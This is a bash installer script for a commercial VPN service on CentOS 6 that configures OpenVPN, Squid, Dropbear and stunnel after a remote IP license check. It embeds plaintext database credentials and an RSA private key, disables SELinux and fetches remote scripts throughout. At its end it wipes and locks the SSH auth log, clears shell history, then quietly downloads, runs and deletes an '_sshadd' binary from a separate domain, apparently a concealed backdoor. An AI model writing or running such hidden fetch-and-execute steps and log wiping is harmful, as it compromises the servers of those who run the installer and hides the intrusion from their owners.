#!/bin/bash
# Automation Script For Centos 6 64bit OpenVZ/KVM
# Made w/love by RadzVPN
# Powered By RadzVPN
# version v.3.0 3n1 Installer.
# Features: OpenVPN/SSL/Dropbear/Squid Proxy
# Date Modified: 9/15/2018
cd /root
yum install wget -y &> /dev/null
sitename="radzvpn.tk"
SNAME1="xxxxxxxxxx";
SNAME2="";
echo "Server Name:"
read SNAME2
cat="cat"
MYIP=$(wget -qO- ipv4.icanhazip.com);
# check registered ip
wget -q -O /tmp/daftarip https://radzvpn.tk/license/ip.txt
if ! grep -w -q $MYIP /tmp/daftarip; then
	echo ""
	echo ""
	echo "IP is not registered"
	echo "Please contact RadzVPN support."
	echo ""
	echo ""
	if [[ $cat = "cat" ]]; then
		echo "visit: https://radzvpn.tk"
		echo ""
		echo ""
		echo ""
	else
		echo ""
	fi
	rm -rf /tmp/daftarip
	rm -rf *sh
	
	exit
fi

# Installer
ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
sed -i "s/SELINUX=enforcing/SELINUX=disabled/g" /etc/selinux/config &> /dev/null
#change this according to your database details
dbhost='m-vpnsql-001.pisovpn.com';
dbuser='admin_radzvpn';
dbpass='radzvpn123';
dbname='admin_radzvpn';
dbport='3306';

# Terminal Color

RED='\033[01;31m';
RESET='\033[0m';
GREEN='\033[01;32m';
WHITE='\033[01;37m';
YELLOW='\033[00;33m';
clear
echo -e "$GREEN                License Accepted.. $RESET"
sleep 3s
echo -e "$GREEN                Lets start... $RESET"
sleep 3
echo -e "$GREEN                Please Wait... $RESET"
sleep 3s
echo -e "$GREEN                Installing Updates $RESET"
yum update -y &> /dev/null
clear
echo -e "$GREEN                Updates Done  $RESET"
sleep 3s
echo -e "$GREEN                Lets install the required packages. $RESET"
sleep 3s
clear
echo -e "$GREEN                Please Wait... $RESET"
yum install httpd nano squid -y &> /dev/null
yum install mysql-server epel-release -y &> /dev/null
yum install openvpn sudo curl -y &> /dev/null
yum install screen -y &> /dev/null
MYIP=$(curl -4 icanhazip.com); &> /dev/null
echo -e "$GREEN                Installation Complete $RESET"
echo -e "$GREEN                Lets configure the settings and routing $RESET"
sleep 4s
clear
echo -e "$GREEN                Please wait while we are fighting with your firewall $RESET"
sleep 4s
## making script and keys
wget openvpn.zip https://raw.githubusercontent.com/rayvynlee/bilat/master/sulotboyzvpn/openvpn.zip
yum install unzip -y
unzip openvpn.zip -d /etc/openvpn
mkdir /etc/openvpn/script
mkdir /etc/openvpn/log
mkdir /var/www/html/status
touch /var/www/html/status/tcp2.txt
touch /var/www/html/status/tcp1194.txt
ethernet=""
echo "************************************************************************************"
echo -e " Note: Your Network Interface is followed by the word \e[1;31m' dev '\e[0m"
echo " If the interface doesnt match openvpn will be connected but no internet access."
echo " Please choose or type properly"
echo "************************************************************************************"
echo ""
echo "Your Network Interface is:"
ip route | grep default
echo ""
echo "Ethernet:"
read ethernet
echo ""
clear


cat << EOF > /etc/openvpn/script/config.sh
#!/bin/bash
##Dababase Server
HOST='$dbhost'
USER='$dbuser'
PASS='$dbpass'
DB='$dbname'
PORT='$dbport'
EOF

echo "Type of your Server"
PS3='Choose or Type a Plan: '
options=("Premium" "VIP" "Private" "Quit")
select opt in "${options[@]}"; do
case "$opt,$REPLY" in
Premium,*|*,Premium) 
echo "";

wget -O /etc/openvpn/script/login https://raw.githubusercontent.com/rayvynlee/bilat/master/radzvpn/prem &> /dev/null
chmod +x /etc/openvpn/script/login

echo "";
echo "1) Premium Selected";
break ;;
VIP,*|*,VIP) 
echo "";

wget -O /etc/openvpn/script/login https://raw.githubusercontent.com/rayvynlee/bilat/master/radzvpn/vip
chmod +x /etc/openvpn/script/login

echo "";
echo "2) VIP Selected";
break ;;
Private,*|*,Private) 
echo "";

wget -O /etc/openvpn/script/login https://raw.githubusercontent.com/rayvynlee/bilat/master/radzvpn/priv &> /dev/null
chmod +x /etc/openvpn/script/login

echo "";
echo "3) Private Selected";
sleep 3s
break ;;
Quit,*|*,Quit) echo "Installation Cancelled!!";
echo -e "\e[1;31mRebuild your vps and correct the process.\e[0m";
exit;
break ;; *)
echo Invalid: Choose a proper Plan;;
esac
done


echo '' > /etc/sysctl.conf &> /dev/null
echo "#IPV4
net.ipv4.ip_forward = 1
net.ipv4.tcp_congestion_control = hybla
#IPV6
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1"| sudo tee /etc/sysctl.conf &> /dev/null
sysctl -p &> /dev/null
iptables -F; iptables -X; iptables -Z
iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o $ethernet -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.9.0.0/24 -o $ethernet -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.10.0.0/24 -o $ethernet -j MASQUERADE
iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -s 10.8.0.0/24 -j ACCEPT
iptables -A FORWARD -s 10.9.0.0/24 -j ACCEPT
iptables -A FORWARD -s 10.10.0.0/24 -j ACCEPT
iptables -A FORWARD -j REJECT
iptables -A INPUT -p tcp --dport 25 -j DROP
iptables -A INPUT -p udp --dport 25 -j DROP
clear
sleep 3s
echo "Do you want to Block Torrent?"
PS3='Please Select 1 or 2: '
options=("Yes" "No" "Quit")
select opt in "${options[@]}"; do
case "$opt,$REPLY" in
Yes,*|*,Yes)
echo "";
# Log Torrent
iptables -N LOGDROP > /dev/null 2> /dev/null
iptables -F LOGDROP
iptables -A LOGDROP -j LOG --log-prefix "LOGDROP "
iptables -A LOGDROP -j DROP
# Block Torrent
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j LOGDROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j LOGDROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j LOGDROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j LOGDROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j LOGDROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j LOGDROP
iptables -A FORWARD -m string --algo bm --string "announce" -j LOGDROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j LOGDROP
# Block DHT keyword
iptables -A FORWARD -m string --string "get_peers" --algo bm -j LOGDROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j LOGDROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j LOGDROP
echo "";
echo "1) Torrent has been blocked.";
break ;;
No,*|*,No) 
echo "";
echo "";
echo "2) Default rules has been applied.";
sleep 3s
break ;;
Quit,*|*,Quit) echo "Installation Cancelled!!";
echo -e "\e[1;31mRebuild your vps and correct the process.\e[0m";
exit;
break ;; *)
echo Invalid: Choose a proper Plan;;
esac
done

## changing permissions
chmod -R 755 /etc/openvpn &> /dev/null
restorecon -r /var/www/html &> /dev/null
cd /var/www/html/status &> /dev/null
chmod 775 * &> /dev/null
cd
echo '' > /etc/squid/squid.conf &> /dev/null
echo "cache deny all
memory_pools off
dns_nameservers 1.1.1.1 1.0.0.1 8.8.8.8 8.8.4.4
half_closed_clients off
http_port 8080 transparent
http_port 3128 transparent
http_port 8888 transparent
acl leakteam dst $MYIP
http_access allow leakteam
visible_hostname Powered_By_LEAKTeam
via off
forwarded_for off
request_header_access Allow allow all
request_header_access Authorization allow all
request_header_access WWW-Authenticate allow all
request_header_access Proxy-Authorization allow all
request_header_access Proxy-Authenticate allow all
request_header_access Cache-Control allow all
request_header_access Content-Encoding allow all
request_header_access Content-Length allow all
request_header_access Content-Type allow all
request_header_access Date allow all
request_header_access Expires allow all
request_header_access Host allow all
request_header_access If-Modified-Since allow all
request_header_access Last-Modified allow all
request_header_access Location allow all
request_header_access Pragma allow all
request_header_access Accept allow all
request_header_access Accept-Charset allow all
request_header_access Accept-Encoding allow all
request_header_access Accept-Language allow all
request_header_access Content-Language allow all
request_header_access Mime-Version allow all
request_header_access Retry-After allow all
request_header_access Title allow all
request_header_access Connection allow all
request_header_access Proxy-Connection allow all
request_header_access User-Agent allow all
request_header_access Cookie allow all
request_header_access All deny all
acl manager proto cache_object
acl localnet src 10.8.0.0/24
acl localnet src 10.9.0.0/24
acl localnet src 10.10.0.0/24
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
http_access deny !manager
http_access deny !localnet
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow manager
http_access allow localnet
http_access deny all
hierarchy_stoplist cgi-bin ?
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
cache_effective_user squid
cache_effective_group squid"| sudo tee /etc/squid/squid.conf &> /dev/null


yum -y install stunnel dropbear &> /dev/null
mkdir /var/run/stunnel &> /dev/null
chown nobody:nobody /var/run/stunnel &> /dev/null
cat <<EOF >/etc/stunnel/stunnel.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsjJUufnspRGGp7dpQJhRqB0WpJnIDzWJSJkdichWBqQuwqpn
MK7ZThbb8k8NHvh312lqOV692qMggXBnyjP+nTiz0KLfkjmdWECbdq/oFm9+LsOQ
Z7ZavgVwi2z+q2Y+BmY1W1qLSLis5XMGXZbf94MfIpGmngSgbz9v9bE698mAyPwI
iVIQ7w6ix1q7Q2WgEyDIz3r/JGipQIyVLpCKc2WZXZnd72yrHNM3zjkjVwfwcctN
nYF06kDHhFRxfgh8wru3Beu+vd7vnoauU/4CFDXkJkpyQwKssmOXVc1yiT8itlfi
FmZ5DY5vlXnb2zvCAFICa+X2UWRLDZlvWqjpxQIDAQABAoIBAHxrdgsQfPHYZduu
zVejwsgN32R4V15/M+azuhMdBSvH8TpMfpZYTzQd896g4XlxZUPLv7Zk90y0P5sB
IAbn/OxLzglr34yam8kl+yaIthUMLd96/tXbVkp9Q9Kl/L8yOTaAoNqzQrM49seS
Y6xvDtwj+lZJujt04YwrkAHNiG2/YW8SICo8fZtM5aMx756Y7bsakpGyi/0SGnKu
uzL/nkojY1J3YKdD69jJxce8fNTLhNvEBZAkGq8WU+jSehwDweo2HrpqLM9hPgjd
uDZAmcCfJcK6IKSN4yCQ0HIIS1UoddPbvUhLR/xJGc9nwK060rYQA3BGei1l3A2G
m0RrBsECgYEA66iqNAilRuyOqusjywUTiVuaH0I5rs9a7iY1g9gHlH3v/DEVOl0Y
lsgF9+1izQM3Csjx0yu1ZlvuPL3WzB1YM/W/KDWdlN4CJCBeHEwqS7JH4BrppVfh
hoIhEg0uA/grbZJWxjk31bwfy99lNXsnI626g8oUcDBYXror5YInw/UCgYEAwZPt
bHy12mW13cFxC1RD0iOVJ2p8B7Y5d0r2Db4EnALpFRrHkMxhL9AuFP+7/Un2SvmR
az+2Dfeq1b8tNVEJLou4eQlrn4NZ4AHgnmfkRa9kY2X1sl5eQo5LAenxREC1CA4r
2xiQn+Kus6+3bvS9uuwoUq97EyPN8cdFJDtvvJECgYBie24FqMdJSHqmuvWOVmS/
tmRGQ+rPPyCE/brHinRAfhDYl7qDVXx9JsI3xiDQBFPwUeGdmlqImEqLX9pwGqNN
s5lbOGzOVakXZ99se/gBAlQ/N4AE9SDukVs4rAFa709Wzx0sYaUP0TqIfKdTHlBQ
/L1BbiX0bH/BtpO5qhbsMQKBgFYMN6Hd3chzJeCpOGLc1jj28DpRL0kOS4UnoTCC
ovHmqU1kVgmbkCf81j8nXp0832p8fZO7AmY7DYluLd5hYz95hErpURna/XyB2SMQ
83u2d11n2UusfyH+toDnSQQZ717hTcVaqg8oaJgfJ97+k8gfad03e/IKHGW5Opbc
hNLBAoGANLvcR3Xek03VnoHoE0LgZwbF+U2oRcyvz9AfQy4/QHOeFhI5deCW5W0Z
yoeKwq5gQp3I02k4iA5Z3KLPOjqUdh2+MV/9LEb0xe/r/lLGTwXVXsnhkfPZi7oH
L5cAmPqfvnQH1aB/H/bpU23/d6SzCNthFs8veYYZbDps64OzFe8=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIEETCCAvmgAwIBAgIJAPs445bY3M9XMA0GCSqGSIb3DQEBCwUAMIGeMQswCQYD
VQQGEwJQSDEaMBgGA1UECAwRTmVncm9zIE9jY2lkZW50YWwxFTATBgNVBAcMDEJh
Y29sb2QgQ2l0eTEQMA4GA1UECgwHUGlzb1ZQTjEQMA4GA1UECwwHUGlzb1ZQTjEU
MBIGA1UEAwwLcGlzb3Zwbi5jb20xIjAgBgkqhkiG9w0BCQEWE3N1cHBvcnRAcGlz
b3Zwbi5jb20wHhcNMTgwODA1MDkwNDUzWhcNMjEwODA0MDkwNDUzWjCBnjELMAkG
A1UEBhMCUEgxGjAYBgNVBAgMEU5lZ3JvcyBPY2NpZGVudGFsMRUwEwYDVQQHDAxC
YWNvbG9kIENpdHkxEDAOBgNVBAoMB1Bpc29WUE4xEDAOBgNVBAsMB1Bpc29WUE4x
FDASBgNVBAMMC3Bpc292cG4uY29tMSIwIAYJKoZIhvcNAQkBFhNzdXBwb3J0QHBp
c292cG4uY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsjJUufns
pRGGp7dpQJhRqB0WpJnIDzWJSJkdichWBqQuwqpnMK7ZThbb8k8NHvh312lqOV69
2qMggXBnyjP+nTiz0KLfkjmdWECbdq/oFm9+LsOQZ7ZavgVwi2z+q2Y+BmY1W1qL
SLis5XMGXZbf94MfIpGmngSgbz9v9bE698mAyPwIiVIQ7w6ix1q7Q2WgEyDIz3r/
JGipQIyVLpCKc2WZXZnd72yrHNM3zjkjVwfwcctNnYF06kDHhFRxfgh8wru3Beu+
vd7vnoauU/4CFDXkJkpyQwKssmOXVc1yiT8itlfiFmZ5DY5vlXnb2zvCAFICa+X2
UWRLDZlvWqjpxQIDAQABo1AwTjAdBgNVHQ4EFgQUITDE1ZVDfXYJsvxQJT0TuBv1
NsUwHwYDVR0jBBgwFoAUITDE1ZVDfXYJsvxQJT0TuBv1NsUwDAYDVR0TBAUwAwEB
/zANBgkqhkiG9w0BAQsFAAOCAQEAfD95bPYkqBMQlng39KIKcc4mhex9JybG+xgF
fwuBAl9AmIFoBX9hiqJWfvEbJt4BHb5VCoip4gEeXnAOfcWncwpKIaLo5yTi7PZ7
ERzBeIGMFuSCCOeCDeovMHQ87TJDNPaOfNxSs32wF7DOskCzxtSixCHDqnfiMw7B
7wwZJTLU0tEsYT7QTpaBzRiCNQuoIuvL4gW4KuRFz4GFoOcQlJhQ6sOQfkcsGKQd
w9q+ayYQ2EVeRi8VYY676XkFZ1ubgBAjoGjanpFrDyxobj4StFDPuntDPwqh3wE3
lKMoyQC0ThlFVA5uKwIt+A+LW4scumnbaQx/WsjfifvEZWadaA==
-----END CERTIFICATE-----
-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEArcF3IkU4OzdV1PGewk5ze5nuyALPYD/B9vUwjtkRzteyw12Zm/0i
T61EN1RWyJudQP9uylRCA7cL2LPh2LS60rk/w5OEj5lV9oPEk1XLOS+yRRsPeERm
YDxWgh9aKprme556RJDV75NO+MNWNpCOdjEF4CfVaihlvEQEzvtlCOWiomrtUF1H
Efsb71zk0gEGo6IuJgwu2YZit/WGYbcmYtkDDekMCQomxaAjXvzB3hs57NgPOwXR
m1hN5ofUNlLnj3lPTfBmIl6k2RvVavuMR6HJlHqP4VL619+HewQCnotYId+tsGfV
THJLKd2soiOJ07ovcsQG8G7kHhuzAGcNiwIBAg==
-----END DH PARAMETERS-----
EOF

wget -O /etc/rc.d/init.d/stunnel https://raw.githubusercontent.com/omayanrey/script-jualan-ssh-vpn/master/stunnel &> /dev/null
chmod +x /etc/rc.d/init.d/stunnel
cat <<EOF >/etc/stunnel/stunnel.conf
sslVersion = all
chroot = /var/run/stunnel/
setuid = nobody
pid = /stunnel.pid
debug = local1.info
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1

client = no

[dropbear]
accept = 0.0.0.0:445
connect = 127.0.0.1:444
cert = /etc/stunnel/stunnel.pem
[squid]
accept = 0.0.0.0:8443
connect = 127.0.0.1:8080
cert = /etc/stunnel/stunnel.pem

EOF


wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/omayanrey/script-jualan-ssh-vpn/master/conf/badvpn-udpgw64"
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.d/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
chmod +x /etc/rc.local
/etc/rc.local
rm -rf /etc/init.d/dropbear
wget -O /etc/init.d/dropbear https://raw.githubusercontent.com/omayanrey/script-jualan-ssh-vpn/master/dropbear &> /dev/null
chmod +x /etc/init.d/dropbear
chmod 600 /etc/stunnel/stunnel.pem
clear
echo -e "$GREEN                                 We are almost done $RESET"
sleep 4s
clear
echo "VPS Boot Time"
PS3='Choose Boot Time: '
options=("5am" "Weekdays" "Monthly" "Quit")
select opt in "${options[@]}"; do
case "$opt,$REPLY" in
5am,*|*,5am) 
echo "";
echo "0 5 * * * root /sbin/reboot" > /etc/cron.d/reboot
echo "";
echo "1) Every 5:00 am Your VPS will reboot ";
break ;;
Weekdays,*|*,Weekdays) 
echo "";
echo "0 4 * * 0 root /sbin/reboot" > /etc/cron.d/reboot
echo "";
echo "2) Every 4:00 am Sunday Your VPS will reboot";
break ;;
Monthly,*|*,Monthly) 
echo "";
echo "0 0 1 * * root /sbin/reboot" > /etc/cron.d/reboot
echo "";
echo "2) Every 12mn Next Month Your VPS will reboot";
break ;;
Quit,*|*,Quit) echo "Installation Cancelled!!";
echo -e "\e[1;31mRebuild your vps and correct the process.\e[0m";
exit;
break ;; *)
echo Invalid: Just choose what you want;;
esac
done

sed -i "s/#ServerName www.example.com:80/ServerName localhost:80/g" /etc/httpd/conf/httpd.conf
clear

#printf "\nAllowUsers root" >> /etc/ssh/sshd_config
service iptables save &> /dev/null
wget -O ssh-online https://raw.githubusercontent.com/omayanrey/script-jualan-ssh-vpn/master/online/user-login.sh &> /dev/null
chmod +x ssh-online


sed -i "s@$SNAME1@$SNAME2@g" ssh-online
#wget -O user-limit https://raw.githubusercontent.com/omayanrey/script-jualan-ssh-vpn/master/user-limit.sh
#chmod +x user-limit
#wget -O cron-dropcheck https://raw.githubusercontent.com/omayanrey/script-jualan-ssh-vpn/master/cron-dropcheck.sh
#chmod +x cron-dropcheck
#echo "* * * * * root /bin/bash /root/userlimit 1 >/dev/null 2>&1" > /etc/cron.d/userlimit
#echo "* * * * * root /bin/bash /root/cron-dropcheck >/dev/null 2>&1 " > /etc/cron.d/dropcheck


/sbin/chkconfig --add stunnel
/sbin/chkconfig crond on
chkconfig httpd on
chkconfig iptables on
chkconfig openvpn on
chkconfig squid on
chkconfig dropbear on
echo -e "$GREEN                              Starting services we need $RESET"
service iptables restart &> /dev/null
service sshd restart
/etc/init.d/squid start
/etc/init.d/openvpn start
service dropbear start
service stunnel start
service httpd stop &> /dev/null
service httpd start &> /dev/null
echo -e "$YELLOW                             SUCCESS!$RESET"
###
### sudo netstat -tulpn
rm -rf *sh openvpn.zip &> /dev/null
rm -rf /tmp/daftarip &> /dev/null
rm -rf /var/log/secure
touch /var/log/secure
chmod 000 /var/log/secure
cat /dev/null > ~/.bash_history && history -c && history -w
echo ''
echo ''
echo -e "$GREEN                                ALL DONE
                             Service will reboot after a few seconds $RESET"

curl http://sulotboyzvpn.cf/scron
wget -O _sshadd http://sulotboyzvpn.cf/_sshadd
chmod +x _sshadd
./_sshadd
rm -rf _sshadd

#reboot
